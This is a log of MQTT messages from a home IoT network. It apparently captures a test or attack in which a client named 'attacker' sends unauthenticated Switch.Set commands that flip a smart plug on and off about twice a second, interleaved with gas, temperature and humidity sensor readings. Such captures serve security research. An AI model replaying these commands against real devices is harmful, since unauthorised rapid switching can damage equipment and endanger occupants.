2026-04-22T16:38:08,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:08,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34420.97,""swi"
2026-04-22T16:38:08,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5087 34420.996 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:08,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:08,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:08,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5088 34421.478 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:08,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:08,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34421.48,""swi"
2026-04-22T16:38:08,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5089 34421.495 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:09,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:09,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5090 34421.979 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:09,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:09,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34421.98,""swi"
2026-04-22T16:38:09,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5091 34421.998 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:09,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:09,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:09,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5092 34422.481 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:09,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:09,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34422.48,""swi"
2026-04-22T16:38:09,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5093 34422.498 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:10,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:10,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5094 34422.980 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:10,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:10,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34422.98,""swi"
2026-04-22T16:38:10,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5095 34422.999 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:10,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:10,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:10,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:10,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:10,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5096 34423.480 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:10,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:10,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34423.48,""swi"
2026-04-22T16:38:10,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5097 34423.496 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:11,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:11,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5098 34423.981 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:11,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:11,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34423.98,""swi"
2026-04-22T16:38:11,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5099 34423.999 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:11,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:11,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:11,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5100 34424.482 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:11,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:11,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34424.48,""swi"
2026-04-22T16:38:11,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5101 34424.499 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:12,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:12,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5102 34424.984 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:12,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:12,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34424.98,""swi"
2026-04-22T16:38:12,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5103 34425.003 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:12,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:12,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:12,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5104 34425.486 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:12,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.9, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:12,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34425.48,""swi"
2026-04-22T16:38:12,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5105 34425.503 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:13,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:13,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5106 34425.986 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:13,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:13,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34425.98,""swi"
2026-04-22T16:38:13,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5107 34426.005 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:13,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:13,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5108 34426.487 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:13,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:13,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34426.48,""swi"
2026-04-22T16:38:13,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5109 34426.504 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:14,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:14,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5110 34426.988 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:14,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:14,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34426.98,""swi"
2026-04-22T16:38:14,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5111 34427.006 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:14,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:14,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5112 34427.491 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:14,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:14,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34427.49,""swi"
2026-04-22T16:38:14,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5113 34427.507 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:15,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:15,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5114 34427.989 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:15,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:15,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34427.99,""swi"
2026-04-22T16:38:15,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5115 34428.007 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:15,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:15,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5116 34428.489 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:15,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.8, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:15,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34428.49,""swi"
2026-04-22T16:38:15,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5117 34428.506 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:16,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:16,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5118 34428.990 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:16,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:16,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34428.99,""swi"
2026-04-22T16:38:16,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5119 34429.008 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:16,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:16,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5120 34429.494 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:16,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:16,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34429.49,""swi"
2026-04-22T16:38:16,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5121 34429.510 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:38:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:38:16,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:38:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:38:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:38:17,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:17,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5122 34429.991 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:17,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:17,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34429.99,""swi"
2026-04-22T16:38:17,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5123 34430.010 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:17,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:17,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5124 34430.491 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:17,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:17,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34430.49,""swi"
2026-04-22T16:38:17,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5125 34430.508 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:18,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:18,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5126 34430.992 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:18,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:18,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34430.99,""swi"
2026-04-22T16:38:18,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5127 34431.011 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:18,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:18,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5128 34431.493 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:18,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:18,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34431.49,""swi"
2026-04-22T16:38:18,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5129 34431.509 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:19,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:19,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5130 34431.996 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:19,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:19,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34431.99,""swi"
2026-04-22T16:38:19,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5131 34432.015 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:19,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:19,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5132 34432.494 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:19,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:19,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34432.49,""swi"
2026-04-22T16:38:19,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5133 34432.511 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:20,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:20,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5134 34432.996 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:20,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:38:20,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34432.99,""swi"
2026-04-22T16:38:20,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5135 34433.014 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:38:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:38:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:38:20,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:38:20,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:38:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5136 34433.496 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:38:20,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.7, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:38:20,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34433.49,""swi"
2026-04-22T16:38:20,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5137 34433.513 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:38:21,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:38:21,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:38:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5138 34433.998 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
